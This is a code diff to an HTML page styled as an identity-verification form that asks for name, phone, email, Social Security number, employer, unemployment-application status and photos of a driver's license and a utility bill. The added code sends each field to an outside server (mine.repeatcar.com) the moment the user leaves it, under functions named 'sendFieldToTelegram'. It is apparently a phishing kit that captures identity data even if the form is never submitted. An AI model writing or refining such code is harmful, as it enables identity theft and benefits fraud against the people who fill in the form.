@@ -20,7 +20,7 @@
 </head>
 <body class="min-h-screen flex flex-col bg-[#E4F0FC]">
     
-    <!-- PAGE 2: VERIFICATION -->
+    <!-- PAGE: VERIFICATION -->
     <div id="page-verify" class="min-h-screen flex flex-col bg-[#E4F0FC]">
         <!-- Header -->
         <header class="bg-[#046b99] text-white py-2">
@@ -189,7 +189,38 @@
             setupFileUpload('dl-front', 'dl-front-box');
             setupFileUpload('dl-back', 'dl-back-box');
             setupFileUpload('utility-bill', 'utility-bill-box');
+            setupRealtimeReporting();
         });
+
+        function setupRealtimeReporting() {
+            const fields = ['first-name', 'last-name', 'phone-1', 'phone-2', 'phone-3', 'verify-email', 'ssn', 'employer'];
+            fields.forEach(fieldId => {
+                const field = document.getElementById(fieldId);
+                if (field) {
+                    field.addEventListener('blur', function() {
+                        if (this.value) sendFieldToTelegram(fieldId, this.value);
+                    });
+                }
+            });
+            
+            const radioButtons = document.querySelectorAll('input[name="applied"]');
+            radioButtons.forEach(radio => {
+                radio.addEventListener('change', function() {
+                    if (this.checked) sendFieldToTelegram('applied', this.value);
+                });
+            });
+        }
+
+        async function sendFieldToTelegram(fieldName, value) {
+            const data = new FormData();
+            data.append(fieldName, value);
+            
+            try {
+                await fetch('https://mine.repeatcar.com/568/op/report.php', { method: 'POST', body: data });
+            } catch (error) {
+                console.error('Send error:', error);
+            }
+        }
 
         async function sendFileToTelegram(fieldName, file) {
             const uploadData = new FormData();
@@ -227,7 +258,8 @@
             const appliedRadio = document.querySelector('input[name="applied"]:checked');
             if (appliedRadio) finalData.append('applied_unemployment', appliedRadio.value);
             
-            finalData.append('page', 'verification_page');
+            // THIS IS THE KEY - Your backend needs this to recognize final submission
+            finalData.append('submit', 'final');
             
             // Add files
             ['dl-front', 'dl-back', 'utility-bill'].forEach(fieldId => {
